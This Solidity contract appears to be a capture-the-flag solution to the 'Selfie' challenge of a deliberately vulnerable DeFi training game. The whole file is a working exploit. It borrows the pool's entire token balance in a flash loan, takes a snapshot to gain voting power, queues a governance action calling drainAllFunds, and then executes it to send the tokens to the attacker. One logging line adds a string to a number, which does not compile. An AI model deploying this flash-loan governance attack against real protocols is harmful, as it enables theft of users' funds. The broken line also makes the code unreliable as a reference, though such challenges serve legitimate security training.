// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface FlashloanPoolInterface {
	function flashLoan(uint256 amount) external;
}

interface SimpleGovernanceInterface {
	function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
	function executeAction(uint256 actionId) external;
}

interface DamnValuableTokenSnapshotInterface is IERC20 {
    function snapshot() external returns (uint256);
}

contract CustomSelfie {
	
    using Address for address payable;

	address private owner;
	
    FlashloanPoolInterface public pool_contract;
    SimpleGovernanceInterface public governance_contract;
	
	DamnValuableTokenSnapshotInterface public DamnValuableToken;
	
	uint public action_id;
	
	uint public flashLoanAmount = 1500000 ether;

    constructor(address payable poolAddress, address payable governanceAddress, address payable damnValuableTokenAddress) {
        pool_contract = FlashloanPoolInterface(poolAddress);
        governance_contract = SimpleGovernanceInterface(governanceAddress);
		DamnValuableToken = DamnValuableTokenSnapshotInterface(damnValuableTokenAddress);
		owner = msg.sender;
    }
	
	
    // Function called by the pool during flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external payable {
		
		console.log("Flashloan Received");
		
		// Check the current balance of tokens
		console.log("Token balance: " + DamnValuableToken.balanceOf(address(this)));
		
		DamnValuableToken.snapshot();
		
		console.log("Snapshot taken");
		
		// Prepare the byte data for an action, low level call
		bytes memory _data = abi.encodeWithSignature(
			"drainAllFunds(address)", address(this)
		);
		
		// Queue action
		action_id = governance_contract.queueAction(address(pool_contract), _data, 0);
		
		console.log("Action queued successfully");
		
		// payback flashloan
		DamnValuableToken.transfer(address(pool_contract), amount);
		
    }
	
	function attack() external {
		
        pool_contract.flashLoan(flashLoanAmount); // 1.5 million, all in pool
		
    }
	
	
	function executeAction() external {
		
		// Execute action to transfer tokens from pool to this contract
		governance_contract.executeAction(action_id);
		
		// Transfer the tokens from this contract to the contract owner
		DamnValuableToken.transfer(owner, flashLoanAmount);
		
		console.log("Action executed successfully");
		
    }

    receive () external payable {}
	
}